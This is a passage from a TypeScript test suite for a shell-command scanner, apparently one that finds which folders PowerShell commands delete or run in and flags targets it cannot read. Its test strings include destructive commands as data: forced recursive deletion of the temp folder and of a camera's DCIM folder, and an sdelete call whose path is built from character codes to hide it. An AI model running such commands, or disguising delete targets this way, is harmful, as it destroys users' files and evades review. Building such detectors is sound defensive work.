    expect(ofOp(t, 'delete').some(p => p.anchor === 'temp')).toBe(true)
    expect(scan('Remove-Item -Recurse -Force ([IO.Path]::GetTempPath())').tempRedirected).toBeNull()
    const stale = scan('Set-Location "$((Get-Volume -FileSystemLabel LUMIX).DriveLetter):/"; Remove-Item "$PWD/DCIM" -Recurse -Force')
    expect(ofOp(stale, 'delete').some(p => p.staleBase)).toBe(true)
    expect(scan('Set-Location (Get-PSDrive D).Root; python clean.py').unreadFolder?.verb).toBe('python')
    expect(scan("$t = [char]68 + ':\\DCIM'; sdelete -s -q $t").unreadOperand?.verb).toBe('sdelete')
    // keywords, expressions and read-only cmdlets are not programs
    for (const c of ['if (-not $?) { exit 1 }', '[Math]::Min($a, $b)', '$x | Select-Object -First $n', '(Get-Date) - $start']) {
      expect(scan(c).unreadOperand, c).toBeNull()
    }
  })
  it('the folder a program, a script, an interpreter or git is started in is one of its operands', () => {
    const started = (c: string, base = BASE) => scanShellText(c, base, W, { platform: 'win32' }).paths.filter(p => p.startedIn).map(p => p.path)
    expect(started('cd D:\\; python C:\\Users\\u\\proj\\clean.py')).toEqual(['D:\\'])
    expect(started('cd C:\\Users\\u; git status')).toEqual(['C:\\Users\\u'])
    expect(started('npm test')).toEqual([BASE])
    expect(started("Start-Process python -ArgumentList 'C:\\Users\\u\\proj\\clean.py' -WorkingDirectory D:\\")).toEqual(['D:\\'])
    expect(started('Get-ChildItem | Select-Object Name')).toEqual([])
  })
  it('honest shapes stay readable: no unread target and no self-building marker', () => {
    for (const c of [
      'cmd /c "echo it\'s done"', "git log --author='bot@example' -5", "Write-Output 'mail me @'",
      "$dirs = 'build',\n  'dist'\nRemove-Item $dirs -Recurse -Force", "Remove-Item ('{0}\\{1}' -f 'build', 'cache') -Recurse -Force",
      '$t = Get-Item x; Remove-Item $t', 'Get-ChildItem tests -Filter *.py | ForEach-Object { python -m pytest $_.FullName -q }',
      "Get-ChildItem -Recurse -Filter *.py | ForEach-Object { (Get-Content $_.FullName) -replace 'a','b' | Set-Content $_.FullName }",
      "Set-Content src\\save.py @'\nfrom pathlib import Path\np = Path.home() / '.civkings'\n'@",
    ]) {
      const s = scan(c)
      expect(s.unresolvedMutation, c).toBeNull()
      expect(s.selfBuilding, c).toBeNull()
    }
  })
})
